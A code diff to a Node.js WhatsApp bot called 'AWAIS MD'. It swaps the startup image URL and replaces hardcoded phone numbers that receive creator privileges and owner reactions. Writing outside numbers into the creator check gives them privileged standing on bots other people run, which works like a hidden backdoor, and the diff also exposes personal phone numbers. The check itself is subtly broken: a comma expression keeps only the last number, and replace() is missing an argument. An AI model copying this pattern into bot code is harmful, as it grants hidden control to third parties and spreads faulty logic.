@@ -1,3 +1,4 @@
+
 const {
   default: makeWASocket,
     useMultiFileAuthState,
@@ -113,7 +114,7 @@ const {
   console.log('Bot connected to whatsapp ✅')
   
   let up = `*YOUR BOT AWAIS MD ACTIVE NOW ENJOY♥️*\n\n*PREFIX:* ${prefix}`;
-    conn.sendMessage(conn.user.id, { image: { url: `https://i.ibb.co/Z6Mf1mWt/shaban-md.jpg` }, caption: up })
+    conn.sendMessage(conn.user.id, { image: { url: `https://github.com/Awais-star-a11y/TESTING-REPO/raw/refs/heads/main/IMG-20250409-WA0093.jpg` }, caption: up })
   }
   })
   conn.ev.on('creds.update', saveCreds)
@@ -193,7 +194,7 @@ const {
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
   const udp = botNumber.split('@')[0];
-    const ikratos = ('923146375610', '994402823120');
+    const ikratos = ('923470027813', '923418191346', '923191089077');
     let isCreator = [udp, ikratos, config.DEV]
 					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
 					.includes(mek.sender);
@@ -240,17 +241,17 @@ const {
 				}
  //================ownerreact==============
     
- if(senderNumber.includes("923146375610")){
+ if(senderNumber.includes("923182832887")){
   if(isReact) return
   m.react("👑")
   }
   
-  if(senderNumber.includes("923146375610")){
+  if(senderNumber.includes("923182832887")){
   if(isReact) return
   m.react("👑")
   }
   
-  if(senderNumber.includes("923146375610")){
+  if(senderNumber.includes("923182832887")){
   if(isReact) return
   m.react("🦋")
    }
